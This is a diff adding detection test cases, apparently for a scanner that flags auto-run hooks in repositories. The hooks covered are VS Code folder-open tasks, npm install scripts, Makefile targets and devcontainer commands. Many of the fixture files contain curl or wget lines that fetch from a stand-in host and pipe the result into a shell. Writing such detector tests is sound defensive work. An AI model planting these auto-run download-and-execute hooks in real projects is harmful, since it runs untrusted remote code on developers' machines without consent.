@@ -1255,3 +1255,94 @@ RC-AUTO-088:
           task :default do
             sh "bundle exec rspec"
           end
+
+RC-AUTO-090:
+  positive:
+    - name: folder-open task runs a script that pipes a download into a shell
+      files:
+        .vscode/tasks.json: |
+          {"version": "2.0.0", "tasks": [{"label": "env", "type": "shell",
+            "command": "./scripts/setup.sh", "runOptions": {"runOn": "folderOpen"}}]}
+        scripts/setup.sh: |
+          #!/bin/sh
+          curl -s https://example.invalid/setup | sh
+      expect: [{path: .vscode/tasks.json, severity: critical}]
+    - name: npm install script reaches a download through a Node file and a shell script
+      files:
+        package.json: '{"name": "demo", "scripts": {"postinstall": "node tools/install.js"}}'
+        tools/install.js: |
+          const { execSync } = require("child_process");
+          execSync("sh scripts/fetch.sh");
+        scripts/fetch.sh: |
+          #!/bin/sh
+          wget -qO- https://example.invalid/fetch | bash
+      expect: [{path: package.json, severity: high}]
+    - name: npm script started with npm run from an install script
+      files:
+        package.json: '{"name": "demo", "scripts": {"postinstall": "npm run setup", "setup": "bash setup.sh"}}'
+        setup.sh: "S=$(curl -s https://example.invalid/s); sh -c \"$S\"\n"
+      expect: [{path: package.json, severity: high}]
+    - name: folder-open task runs a make target whose recipe starts a script
+      files:
+        .vscode/tasks.json: |
+          {"version": "2.0.0", "tasks": [{"label": "prep", "command": "make setup",
+            "runOptions": {"runOn": "folderOpen"}}]}
+        Makefile: "build:\n\techo build\n\nsetup: deps\n\t@./tools/get.sh\n\ndeps:\n\techo deps\n"
+        tools/get.sh: "wget -qO- https://example.invalid/get | sh\n"
+      expect: [{path: .vscode/tasks.json, severity: critical}]
+    - name: reached file without an extension in a test folder is checked too
+      files:
+        .vscode/tasks.json: |
+          {"version": "2.0.0", "tasks": [{"label": "t", "command": "bash",
+            "args": ["${workspaceFolder}/tests/bootstrap"], "runOptions": {"runOn": "folderOpen"}}]}
+        tests/bootstrap: "curl -fsSL https://example.invalid/b | bash\n"
+      expect: [{path: .vscode/tasks.json, severity: critical}]
+    - name: dev container command in the container keeps the severity of what it reaches
+      files:
+        .devcontainer/devcontainer.json: '{"image": "mcr.microsoft.com/devcontainers/base:ubuntu", "postCreateCommand": "bash .devcontainer/setup.sh"}'
+        .devcontainer/setup.sh: "curl -fsSL https://example.invalid/c | bash\n"
+      expect: [{path: .devcontainer/devcontainer.json, severity: medium}]
+    - name: task that a folder-open task depends on runs the script
+      files:
+        .vscode/tasks.json: |
+          {"version": "2.0.0", "tasks": [
+            {"label": "main", "dependsOn": ["prepare"], "runOptions": {"runOn": "folderOpen"}},
+            {"label": "prepare", "command": "sh ./prepare.sh"}]}
+        prepare.sh: "curl -s https://example.invalid/p | env sh\n"
+      expect: [{path: .vscode/tasks.json, severity: critical}]
+  negative:
+    - name: folder-open task runs a harmless script
+      files:
+        .vscode/tasks.json: |
+          {"version": "2.0.0", "tasks": [{"label": "env", "command": "./scripts/setup.sh",
+            "runOptions": {"runOn": "folderOpen"}}]}
+        scripts/setup.sh: "#!/bin/sh\nnpm ci\necho ready\n"
+    - name: task that does not run on folder open
+      files:
+        .vscode/tasks.json: '{"version": "2.0.0", "tasks": [{"label": "env", "command": "./setup.sh"}]}'
+        setup.sh: "curl -s https://example.invalid/s | sh\n"
+    - name: script in a vendored folder is not followed
+      files:
+        package.json: '{"name": "demo", "scripts": {"postinstall": "node node_modules/helper/install.js"}}'
+        node_modules/helper/install.js: |
+          require("child_process").execSync("curl -s https://example.invalid/x | sh");
+    - name: more than two files after the entry point are not followed
+      files:
+        .vscode/tasks.json: |
+          {"version": "2.0.0", "tasks": [{"label": "a", "command": "./a.sh",
+            "runOptions": {"runOn": "folderOpen"}}]}
+        a.sh: "./b.sh\n"
+        b.sh: "./c.sh\n"
+        c.sh: "curl -s https://example.invalid/c | sh\n"
+    - name: scripts that call each other end without a finding
+      files:
+        package.json: '{"name": "demo", "scripts": {"preinstall": "sh a.sh"}}'
+        a.sh: "sh b.sh\n"
+        b.sh: "sh a.sh\necho done\n"
+    - name: paths outside the repository and unresolved variables are not followed
+      files:
+        .vscode/tasks.json: |
+          {"version": "2.0.0", "tasks": [{"label": "a",
+            "command": "../outside/setup.sh && /tmp/setup.sh && $HOME/setup.sh && ~/setup.sh",
+            "runOptions": {"runOn": "folderOpen"}}]}
+        setup.sh: "curl -s https://example.invalid/s | sh\n"
